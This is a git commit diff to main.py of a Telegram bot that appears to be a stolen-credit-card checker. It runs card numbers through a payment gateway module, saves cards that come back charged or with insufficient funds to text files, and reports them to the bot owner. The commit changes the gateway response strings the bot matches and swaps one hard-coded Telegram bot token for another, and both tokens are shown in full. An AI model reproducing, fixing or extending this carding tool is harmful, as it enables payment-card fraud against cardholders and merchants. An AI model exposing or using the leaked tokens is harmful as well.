32956e79e9f0f6f1d09b427ab54c2b7de0de13ff
Rodamuser08 <rodamuser08@gmail.com>
2025-05-30 05:30:22 +0700

    Update main.py

--- main.py
+++ main.py
@@ -3,7 +3,7 @@ import telebot,time
 from telebot import types
 from gatet import Tele
 import os
-token = '8072009450:AAFZ30e3Eg7lq4c8cdysOj2eKqutlv7QlUk'
+token = '7492277219:AAGzBhICAWgwrX15iq7z9vi1cqBJjlB5uQg'
 bot=telebot.TeleBot(token,parse_mode="HTML")
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -95,12 +95,12 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 				
 				card_info = f"💳 Card: {cc.strip()} \n📝 Message: Response: {last}"
 
-				if "Approved" in last:
+				if "charge" in last:
 				    with open("thank_cards.txt", "a") as thank_file:
 				        thank_file.write(card_info + "\n")
 				    bot.send_message(owner_id, f"✅ Thank Result Found:\n💳 Card: {cc.strip()}")
 
-				elif "Not sufficient funds" in last:
+				elif "insufficient funds" in last:
 				    with open("insufficient_cards.txt", "a") as insufficient_file:
  				       insufficient_file.write(card_info + "\n")
 				    bot.send_message(owner_id, f"⚠️ Insufficient Funds Card:\n💳 Card: {cc.strip()}")
@@ -111,7 +111,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 #Hit_Sender
 				
 				print(last)
-				if 'Approved' in last:
+				if 'charge' in last:
 					ch += 1
 					bot.reply_to(message, msg)
 					
@@ -121,7 +121,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 				elif 'security code is incorrect' in last or 'security code is invalid' in last:
 					ccn += 1
 					
-				elif 'Not sufficient funds' in last:
+				elif 'insufficient funds' in last:
 					msg = f'''			
 𝐂𝐀𝐑𝐃: <code>{cc}</code>
 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>INSUFFICIENT FUNDS 🔥</code>
